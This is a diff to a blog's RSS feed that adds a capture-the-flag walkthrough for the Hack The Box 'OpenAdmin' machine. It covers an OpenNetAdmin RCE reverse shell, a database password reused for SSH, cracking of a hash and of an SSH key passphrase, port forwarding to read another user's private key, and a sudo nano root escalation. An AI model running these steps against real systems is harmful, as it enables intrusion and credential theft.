@@ -14,8 +14,155 @@
       
       <guid>https://5ysk3y.github.io/htb/guides/openadmin/</guid>
       <description>Overview OpenAdmin was a quick and easy Linux box that uses a common CVE for an application called ONA to get us intial access to the box. From there, we hop between 2 user through some enumeration before exploiting a sudo command to get root.
- NMAP Scan Let&amp;rsquo;s begin by seeing what ports are currently open:
-# Nmap 7.80 scan initiated Sat Jan 4 19:56:44 2020 as: nmap -v -A -oA nmap/openadmin_initial 10.</description>
+ NMAP Scan Let&amp;rsquo;s begin by seeing what ports are currently open:</description>
+      <content>
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/openadmin.png&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;OpenAdmin was a quick and easy Linux box that uses a common CVE for an application called ONA to get us intial access to the box. From there, we hop between 2 user through some enumeration before exploiting a sudo command to get root.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
+&lt;p&gt;Let&amp;rsquo;s begin by seeing what ports are currently open:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sat Jan  4 19:56:44 2020 as: nmap -v -A -oA nmap/openadmin_initial 10.10.10.171
+Nmap scan report for 10.10.10.171
+Host is up (0.026s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=1/4%OT=22%CT=1%CU=38593%PV=Y%DS=2%DC=T%G=Y%TM=5E10EE11
+OS:%P=x86_64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A
+OS:)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54
+OS:DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120
+OS:)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
+OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
+OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
+OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
+OS:0%CD=S)
+
+Uptime guess: 34.527 days (since Sun Dec  1 07:18:22 2019)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=263 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 554/tcp)
+HOP RTT      ADDRESS
+1   42.44 ms 10.10.14.
+2   42.49 ms 10.10.10.171
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Jan  4 19:57:05 2020 -- 1 IP address (1 host up) scanned in 21.38 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
+&lt;p&gt;In a nutshell, we can see two open ports. Since SSH is up to date and we can&amp;rsquo;t directly compromise it, let&amp;rsquo;s move our attention to the web port. I did an initial Gobuster scan on the IP that also targeted HTML/PHP files  - this found 2 more sub-dir websites:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/index.html (Status: 200)
+/music (Status: 301)
+/artwork (Status: 301)
+/sierra (Status: 301)
+/server-status (Status: 403)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;/music&lt;/code&gt; and &lt;code&gt;/sierra&lt;/code&gt; seem to be independant sites, neither with anything too interesting present. That said, one of them (/music) had a link to login that points here:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://10.10.10.171/ona/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;And this is vulnerable to a certain exploit:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;OpenNetAdmin 18.1.1 - Remote Code Execution&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This script requires dos2unix running on it prior to use because of weird character breaks etc but it works as intended out the box. I hijacked an existing reverse-shell script on the server, replacing the port and my IP with sed. Also opened up 9001 on the firewall as its locked down by default. Running the script via the browser got me a rev shell:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/bin/bash ./47691.sh 10.10.10.171/ona/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Once on the box I had a look at the &lt;code&gt;/etc/passwd&lt;/code&gt; file and found the following 2 users with shell access, aside from root:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Jimmy&lt;/li&gt;
+&lt;li&gt;Joanna&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;I then ran linpeas as the www-data user. Most of the interesting stuff appears to to be in the ONA (OpenNetAdmin) dir, i.e. /opt/ona. In here we got some DB creds:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;database_settings.inc.php&lt;/code&gt; :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+$ona_contexts=array (
+  &#39;DEFAULT&#39; =&amp;gt;
+  array (
+    &#39;databases&#39; =&amp;gt;
+    array (
+      0 =&amp;gt;
+      array (
+        &#39;db_type&#39; =&amp;gt; &#39;mysqli&#39;,
+        &#39;db_host&#39; =&amp;gt; &#39;localhost&#39;,
+        &#39;db_login&#39; =&amp;gt; &#39;ona_sys&#39;,
+        &#39;db_passwd&#39; =&amp;gt; &#39;n1nj4W4rri0R!&#39;,
+        &#39;db_database&#39; =&amp;gt; &#39;ona_default&#39;,
+        &#39;db_debug&#39; =&amp;gt; false,
+      ),
+    ),
+    &#39;description&#39; =&amp;gt; &#39;Default data context&#39;,
+    &#39;context_color&#39; =&amp;gt; &#39;#D3DBFF&#39;,
+  ),
+);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Testing this pass with one of the 2 available users; we get access as &lt;em&gt;Jimmy&lt;/em&gt;. I also tried as the Joanna user but that failed. So we have one login:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;jimmy:n1nj4W4rri0R&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Theres a folder named &lt;code&gt;internal&lt;/code&gt; within &lt;code&gt;/var/www&lt;/code&gt; and its owned by Jimmy - only he and the &lt;code&gt;internal&lt;/code&gt; group can access it so www-data cannot. Theres also a few PHP pages in here - they can be viewed directly by running a PHP server:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;php -S [ip:port]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Viewing this you can see that it&amp;rsquo;s a login page that takes you to a page containing a &lt;code&gt;shell_exec&lt;/code&gt; statement. The code itself thankfully contians the password to get past the login form: &lt;code&gt;Revealed&lt;/code&gt; - this was a SHA-512 hash that I cracked via hashes.org.  For testing I also did this via JTR on the my new, totally original, not-ippsec-inspired-what-so-ever, kracken rig:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@kracken:~/hashes/htb/openadmin# john --show --format=Raw-SHA512 hash
+jimmy:Revealed
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The problem with the exec statement is that it runs as as the user thats running the file, i.e. Jimmy, so I couldn&amp;rsquo;t initially see how I&amp;rsquo;d be able to leverage it. Even more annoyingly the default exec command is a cat request to Joanna&amp;rsquo;s id_rsa file, so it&amp;rsquo;s like a double taunt.&lt;/p&gt;
+&lt;p&gt;Digging further, I eventually noticed that the internal group shares both Jimmy and Joanna as common members:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;jimmy@openadmin:/home$ cat /etc/group | grep -i internal
+internal:x:1002:jimmy,joanna
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking at listening ports on the machine we can also see something else interesting:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;jimmy@openadmin:~$ netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp6       0      0 ::1:52846               :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A unique local port (52846) is listening - curling it from the machine shows a page very similar to the one mentoned above in the internal folder. The problem is we cant access that port from our side to view the page via something like firefox. Except we can, using SSH port forwarding of course. I did this in the following manner:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Login to the box via the usual means.&lt;/li&gt;
+&lt;li&gt;On a brand new line press: &lt;code&gt;Shift&lt;/code&gt; + &lt;code&gt;~&lt;/code&gt; + &lt;code&gt;C&lt;/code&gt; to drop into an interactive SSH prompt.&lt;/li&gt;
+&lt;li&gt;Forward in the following manner:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;code&gt;-L 9001:127.0.0.1:52846&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Alternatively, if I&amp;rsquo;ve fluffed that up on the writeup, you can also do it in the following single line:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ssh -L 9001:127.0.0.1:52846 -f -N jimmy@10.10.10.171&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This basically says that the client (i.e ME) will listen (-L) on port 9001, and SSH will tunnel those connections from 127.0.0.1, port 52846 - which is what we want as per the netstat. The full SSH command includes 2 additional flags - &lt;code&gt;-f&lt;/code&gt; backgrounds the request so you don&amp;rsquo;t see any output and &lt;code&gt;-N&lt;/code&gt; tells SSH that no commands are to be run - both of these make it so you can seamlessly forward the port to your machine without any output or interaction besides the orignial command.&lt;/p&gt;
+&lt;p&gt;Viewing the page on the forwarded port, we see something interesting. It runs the EXACT same exec code that we see in the &lt;code&gt;internal&lt;/code&gt; directory only this time it runs it as Joanna - meaning we can actually cat the contents of the id_rsa file in her home folder. Result.&lt;/p&gt;
+&lt;p&gt;Once I had the RSA key we used SSH2John to convert it to a format john was happy with and then passed it to the kracken which got us the passphrase: &lt;code&gt;bloodninjas&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Got in as Joanna. Got the user flag. Boom.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
+&lt;p&gt;Root was unbelievably easy compared to the user steps.&lt;/p&gt;
+&lt;p&gt;I ran linPeas but it wasn&amp;rsquo;t really necessary; doing standard enum is enough. So I ran:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;And found out Joanna had sudo access to the following command without a password:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo /bin/nano /opt/priv&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;It was purely a case of running that exact command along with &lt;a href=&#34;https://gtfobins.github.io/gtfobins/nano/#sudo&#34; target=&#34;_blank&#34;&gt;this&lt;/a&gt;
+ from GTFOBins:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+2f907ed450b361b2c2bf4e8795d5b561
+#
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Done! :)&lt;/p&gt;
+</content>
     </item>
     
   </channel>
